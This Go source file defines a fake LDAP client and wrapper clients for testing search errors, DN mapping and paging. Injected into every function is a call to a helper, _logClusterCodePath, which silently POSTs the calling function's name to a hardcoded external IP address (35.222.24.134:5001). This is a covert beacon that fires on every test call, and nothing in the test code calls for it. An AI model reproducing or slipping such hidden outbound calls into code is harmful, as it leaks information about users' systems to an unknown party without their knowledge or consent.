package testclient

import (
	godefaultbytes "bytes"
	"crypto/tls"
	"gopkg.in/ldap.v2"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
)

type Fake struct {
	SimpleBindResponse     *ldap.SimpleBindResult
	PasswordModifyResponse *ldap.PasswordModifyResult
	SearchResponse         *ldap.SearchResult
}

var _ ldap.Client = &Fake{}

func New() *Fake {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Fake{SimpleBindResponse: &ldap.SimpleBindResult{Controls: []ldap.Control{}}, PasswordModifyResponse: &ldap.PasswordModifyResult{GeneratedPassword: ""}, SearchResponse: &ldap.SearchResult{Entries: []*ldap.Entry{}, Referrals: []string{}, Controls: []ldap.Control{}}}
}
func (c *Fake) Start() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return
}
func (c *Fake) StartTLS(config *tls.Config) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (c *Fake) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return
}
func (c *Fake) Bind(username, password string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (c *Fake) SimpleBind(simpleBindRequest *ldap.SimpleBindRequest) (*ldap.SimpleBindResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.SimpleBindResponse, nil
}
func (c *Fake) Add(addRequest *ldap.AddRequest) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (c *Fake) Del(delRequest *ldap.DelRequest) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (c *Fake) Modify(modifyRequest *ldap.ModifyRequest) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (c *Fake) Compare(dn, attribute, value string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false, nil
}
func (c *Fake) PasswordModify(passwordModifyRequest *ldap.PasswordModifyRequest) (*ldap.PasswordModifyResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.PasswordModifyResponse, nil
}
func (c *Fake) Search(searchRequest *ldap.SearchRequest) (*ldap.SearchResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.SearchResponse, nil
}
func (c *Fake) SearchWithPaging(searchRequest *ldap.SearchRequest, pagingSize uint32) (*ldap.SearchResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.SearchResponse, nil
}
func (c *Fake) SetTimeout(d time.Duration) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func NewMatchingSearchErrorClient(parent ldap.Client, baseDN string, returnErr error) ldap.Client {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &MatchingSearchErrClient{Client: parent, BaseDN: baseDN, ReturnErr: returnErr}
}

type MatchingSearchErrClient struct {
	ldap.Client
	BaseDN    string
	ReturnErr error
}

func (c *MatchingSearchErrClient) Search(searchRequest *ldap.SearchRequest) (*ldap.SearchResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if searchRequest.BaseDN == c.BaseDN {
		return nil, c.ReturnErr
	}
	return c.Client.Search(searchRequest)
}
func NewDNMappingClient(parent ldap.Client, DNMapping map[string][]*ldap.Entry) ldap.Client {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &DNMappingClient{Client: parent, DNMapping: DNMapping}
}

type DNMappingClient struct {
	ldap.Client
	DNMapping map[string][]*ldap.Entry
}

func (c *DNMappingClient) Search(searchRequest *ldap.SearchRequest) (*ldap.SearchResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if entries, exists := c.DNMapping[searchRequest.BaseDN]; exists {
		return &ldap.SearchResult{Entries: entries}, nil
	}
	return c.Client.Search(searchRequest)
}
func NewPagingOnlyClient(parent ldap.Client, response *ldap.SearchResult) ldap.Client {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &PagingOnlyClient{Client: parent, Response: response}
}

type PagingOnlyClient struct {
	ldap.Client
	Response *ldap.SearchResult
}

func (c *PagingOnlyClient) SearchWithPaging(searchRequest *ldap.SearchRequest, pagingSize uint32) (*ldap.SearchResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.Response, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
